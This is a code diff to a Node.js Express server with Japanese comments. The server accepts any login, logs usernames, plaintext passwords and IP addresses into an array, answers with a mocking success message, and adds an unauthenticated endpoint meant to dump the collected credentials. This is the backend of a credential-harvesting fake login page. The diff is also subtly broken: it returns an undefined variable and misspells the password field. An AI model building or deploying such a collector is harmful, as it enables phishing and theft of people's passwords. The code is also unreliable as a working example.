@@ -2,7 +2,7 @@ const express = require("express");
 const path = require("path");
 
 const app = express();
-
+const loginLog = [];
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 
@@ -10,23 +10,16 @@ app.use(express.json());
 app.use(express.static(__dirname));
 
 
-// ログインエンドポイント
+// ログイエンドポイント
 app.post("/login", (req, res) => {
 
-  const { identifier, password } = req.body;
-
-  console.log("=== Login Attempt ===");
-  console.log("User:", identifier);
-  console.log("Password:", password);
-  console.log("=====================");
-
-  res.json({
-    success: true,
-    message: "Received"
-  });
+  loginLog.push({user:req.body.user,password:req.body.psssword,ip:req.ip});
+  res.json({ログイン成功:"そりゃそうだろ"});
 
 });
-
+app.get("/login/log",(q,r)=>{
+  r.json(loginHis);
+})
 
 app.listen(process.env.PORT || 3000, () => {
   console.log("Server running");
